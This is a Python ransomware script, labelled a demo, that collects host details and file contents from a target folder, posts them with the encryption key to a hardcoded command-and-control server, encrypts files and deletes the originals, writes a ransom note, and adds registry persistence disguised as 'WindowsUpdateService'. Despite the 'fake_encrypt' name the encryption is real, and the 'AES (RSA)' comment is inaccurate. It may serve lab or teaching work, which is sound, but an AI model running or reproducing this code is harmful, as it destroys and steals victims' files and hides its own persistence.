import os
import tkinter as tk
import subprocess
import requests
import socket
import sys
import platform
import getpass
import base64  
from datetime import datetime
from cryptography.fernet import Fernet 

# ===== CONFIG =====
folder = "C:\\DemoRansom"
kali_ip = "192.168.1.9"
url = f"http://{kali_ip}:5000"
log_file = os.path.join(os.getenv("TEMP"), "ransom_demo.log")

# KEY AES (RSA)
key = Fernet.generate_key()
cipher = Fernet(key) 

# ===== LOG =====
def log(msg):
    with open(log_file, "a") as f:
        f.write(f"{datetime.now()} - {msg}\n")

# ===== 1. DISCOVERY (system info) =====
def collect_system_info():
    info = {}
    try:
        info["hostname"] = socket.gethostname()
        info["username"] = getpass.getuser()
        info["os"] = platform.system() + " " + platform.release()
        info["arch"] = platform.machine()
        info["ip"] = socket.gethostbyname(socket.gethostname())
        info["time"] = str(datetime.now())
        log("Collected system info")
    except Exception as e:
        log(f"System info error: {e}")
    return info

# ===== 2. DISCOVERY (file metadata) =====
def collect_file_info():
    files_data = []
    if not os.path.exists(folder):
        os.makedirs(folder)
    for file in os.listdir(folder):
        path = os.path.join(folder, file)
        if os.path.isfile(path):
            try:
                stat = os.stat(path)
                files_data.append({
                    "name": file,
                    "size": stat.st_size,
                    "modified": str(datetime.fromtimestamp(stat.st_mtime))
                })
            except Exception as e:
                log(f"File stat error: {e}")
    log(f"Collected metadata: {len(files_data)} files")
    return files_data

# ===== 3. COLLECTION =====
def collect_file_content():
    contents = {}
    if not os.path.exists(folder): return contents
    
    for file in os.listdir(folder):
        path = os.path.join(folder, file)
        
        
        if os.path.isfile(path) and file != "README.txt" and not file.endswith(".locked"):
            try:
                
                with open(path, "rb") as f:
                    raw_data = f.read()
                    
                    contents[file] = base64.b64encode(raw_data).decode('utf-8')
            except Exception as e:
                log(f"Read error {file}: {e}")
    return contents

# ===== 4. IMPACT =====
def fake_encrypt():
    count = 0
    for file in os.listdir(folder):
        path = os.path.join(folder, file)

        if os.path.isfile(path) and not file.endswith(".locked") and file != "README.txt":
            try:
                with open(path, "rb") as f:
                    original_data = f.read()
                
                encrypted_data = cipher.encrypt(original_data)
                
                new_path = path + ".locked"
                with open(new_path, "wb") as f:
                    f.write(encrypted_data)
                
                os.remove(path)
                count += 1
            except Exception as e:
                log(f"Encrypt error on {file}: {e}")
    log(f"Encrypted {count} files")

# ===== 5. CREATE RANSOM NOTE =====
def create_readme():
    note_path = os.path.join(folder, "README.txt")
    with open(note_path, "w") as f:
        f.write(
            "===== YOUR FILES ARE ENCRYPTED =====\n\n"
            "All your documents (PDF, EXE, TXT...) have been locked.\n"
            "To decrypt them, you need the private key.\n"
        )
    log("Ransom note created")

# ===== 6. PERSISTENCE =====
def persistence():
    try:
        current_file = os.path.abspath(sys.argv[0])
        subprocess.run([
            "reg", "add",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", "WindowsUpdateService",
            "/t", "REG_SZ",
            "/d", f'"{current_file}"', 
            "/f"
        ], shell=True, capture_output=True)
        log("Persistence added")
    except Exception as e:
        log(f"Persistence error: {e}")

# ===== 7. C2 COMMUNICATION (FIXED: Gá»­i dá»¯ liá»‡u chuáº©n) =====
def send_data():
    try:
        
        payload = {
            "system": collect_system_info(),
            "files": collect_file_info(),
            "content": collect_file_content(),
            "key": key.decode()
        }

       
        response = requests.post(url, json=payload, timeout=20)
        
        if response.status_code == 200:
            log("Data and Key sent to C2 successfully")
        else:
            log(f"C2 returned status code: {response.status_code}")
    except Exception as e:
        log(f"C2 error: {e}")

# ===== 8. POPUP =====
def popup():
    root = tk.Tk()
    root.title("WARNING")
    
    root.attributes("-topmost", True)
    label = tk.Label(
        root,
        text="Your files have been locked!\n\n(AES-128 Encryption Applied)",
        font=("Arial", 14),
        fg="red"
    )
    label.pack(padx=20, pady=20)
    root.mainloop()

# ===== MAIN =====
def main():
    log("=== START ===")
    
    send_data()        
    
   
    fake_encrypt()     
    
    
    create_readme()    
    persistence()      
    popup()            
    log("=== END ===")

if __name__ == "__main__":
    main()